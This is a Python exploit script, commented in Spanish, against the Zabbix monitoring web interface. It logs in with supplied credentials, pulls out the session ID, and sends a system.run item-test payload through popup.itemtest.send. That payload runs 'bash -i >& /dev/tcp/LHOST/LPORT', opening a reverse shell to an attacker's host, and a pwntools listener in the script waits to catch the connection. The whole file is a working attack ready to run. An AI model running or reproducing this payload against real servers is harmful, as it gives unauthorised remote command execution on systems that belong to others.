#!/usr/bin/python3

import requests
import threading
from pwn import listen
import sys

# Validar argumentos
if len(sys.argv) != 6:
    print("Usage: python3 exploit.py <url> <user> <password> <lhost> <lport>")
    sys.exit(1)

# Asignar argumentos a variables
url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = int(sys.argv[5])  # Asegurarse de que sea un entero para el listener


def start_listener():
    """Inicia un listener en el host y puerto especificado."""
    l = listen(lport)
    print(f"Listener started on {lhost}:{lport}, waiting for a connection...")
    print(f"Be patient, it may take a few seconds.")
    conn = l.wait_for_connection()
    print("Connection received!")
    conn.interactive()


def login():
    """Realiza el login y envía el payload para la reverse shell."""
    login_url = f"{url}/index.php"
    login_data = {
        "request": "zabbix.php%3Faction%3Ddashboard.view",
        "name": user,
        "password": password,
        "autologin": "1",
        "enter": "Sign in"
    }

    # Crear una sesión
    session = requests.Session()

    # Hacer la petición POST para iniciar sesión
    login_response = session.post(login_url, data=login_data)

    if login_response.status_code != 200:
        print(f"Failed to log in: {login_response.status_code}")
        return

    print("Logged in successfully")

    # Extraer el SID
    login_content = login_response.text
    sid = None
    if "sid=" in login_content:
        sid = login_content.split("sid=")[1].split("\"")[0]
        print(f"Extracted SID: {sid}")
    else:
        print("Failed to extract SID. Check the login response.")
        return

    # Configurar datos del POST dinámicamente con el host y puerto del listener
    post_data = {
        "key": f"system.run[bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",nowait]",
        "delay": "",
        "value_type": "3",
        "item_type": "0",
        "itemid": "0",
        "interfaceid": "0",
        "get_value": "1",
        "interface[address]": "127.0.0.1",
        "interface[port]": "10050",
        "proxy_hostid": "0",
        "show_final_result": "1",
        "test_type": "0",
        "hostid": "10084",
        "valuemapid": "0",
        "value": "1"
    }

    # Enviar el payload
    payload_url = f"{url}/zabbix.php?sid={sid}&action=popup.itemtest.send"
    res = session.post(payload_url, data=post_data)
    print(f"Payload response: {res.status_code}")
    print(res.text)


if __name__ == "__main__":
    # Iniciar el listener en un hilo separado
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()

    # Iniciar sesión y enviar el payload
    login()